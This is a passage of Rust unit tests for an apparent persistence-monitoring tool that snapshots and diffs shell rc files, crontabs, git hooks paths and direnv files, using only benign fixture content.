        assert_eq!(entry.sha256.len(), 64);
        assert_eq!(entry.size, entry.content.len());
        assert_eq!(entry.kind, PersistenceKind::Crontab);
    }

    #[test]
    fn empty_home_first_scan_yields_no_change() {
        let home = tempdir().unwrap();
        let snap = snapshot_then(home.path(), None);
        // Re-diff with no mutation: all surfaces absent and unchanged.
        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(findings.is_empty());
    }

    #[test]
    fn diff_against_empty_snapshot_reports_present_surfaces() {
        let home = tempdir().unwrap();
        std::fs::write(home.path().join(".zshrc"), b"alias g=git\n").unwrap();
        // Empty snapshot (no baseline). A present rc file with no prior record
        // counts as a change.
        let empty = PersistenceSnapshot::default();
        let findings = diff_against_snapshot(home.path(), None, &empty);
        assert!(rule_ids(&findings).contains(&RuleId::PersistenceShellRcModified));
    }

    #[test]
    fn snapshot_round_trips_through_disk() {
        let dir = tempdir().unwrap();
        let home = tempdir().unwrap();
        std::fs::write(home.path().join(".bashrc"), b"alias l=ls\n").unwrap();
        let entries = scan_with_root(home.path(), None);
        let snap = PersistenceSnapshot::from_entries(&entries);

        let path = dir.path().join("snap.json");
        save_snapshot(&path, &snap).unwrap();
        let loaded = load_snapshot(&path);
        assert_eq!(loaded.schema_version, 1);
        assert!(loaded.entries.contains_key("shell_rc:.bashrc"));
        // Content survives the round-trip so a later diff can show added lines.
        assert_eq!(loaded.entries["shell_rc:.bashrc"].content, "alias l=ls\n");
    }

    #[test]
    fn git_hooks_path_parsed_from_gitconfig() {
        assert_eq!(
            parse_git_hooks_path("[core]\n\thooksPath = /opt/hooks\n").as_deref(),
            Some("/opt/hooks")
        );
        assert_eq!(
            parse_git_hooks_path("core.hooksPath = ~/.githooks\n").as_deref(),
            Some("~/.githooks")
        );
        assert_eq!(parse_git_hooks_path("[user]\n\tname = x\n"), None);
    }

    #[test]
    fn envrc_ancestry_walk_finds_parent_envrc() {
        let root = tempdir().unwrap();
        let child = root.path().join("a").join("b");
        std::fs::create_dir_all(&child).unwrap();
        std::fs::write(root.path().join(".envrc"), b"use node\n").unwrap();

        let entries = collect_envrc_ancestry(&child);
        assert!(
            entries.iter().any(|e| e.kind == PersistenceKind::Direnv),
            "ancestry walk should find the parent .envrc, got {entries:?}"
        );
    }
}
